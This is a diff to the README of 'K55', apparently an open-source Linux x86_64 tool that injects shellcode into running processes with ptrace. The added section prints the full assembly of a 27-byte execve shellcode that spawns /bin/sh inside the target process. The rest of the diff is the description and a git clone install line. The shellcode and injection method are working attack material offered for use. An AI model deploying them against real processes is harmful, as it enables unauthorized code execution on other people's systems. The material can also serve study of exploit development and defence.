@@ -1,7 +1,35 @@
 ## K55 - Linux x86_64 Process Injection Utility (C++11)
 
 ## About K55 
-The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. <br/>
+The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. The shellcode spawned in the target process is 27 bytes and it executes /bin/sh (spawns a bash shell) within the target's address space.<br/>
+
+## Assembly of The Payload
+```asm
+main:
+    ;mov rbx, 0x68732f6e69622f2f
+    ;mov rbx, 0x68732f6e69622fff
+    ;shr rbx, 0x8
+    ;mov rax, 0xdeadbeefcafe1dea
+    ;mov rbx, 0xdeadbeefcafe1dea
+    ;mov rcx, 0xdeadbeefcafe1dea
+    ;mov rdx, 0xdeadbeefcafe1dea
+    xor eax, eax
+    mov rbx, 0xFF978CD091969DD1
+    neg rbx
+    push rbx
+    ;mov rdi, rsp
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    ;mov rsi, rsp
+    push rsp
+    pop rsi
+    mov al, 0x3b
+    syscall
+```
+
 
 ## Installation
 1. ``git clone https://github.com/josh0xA/K55.git``<br/>
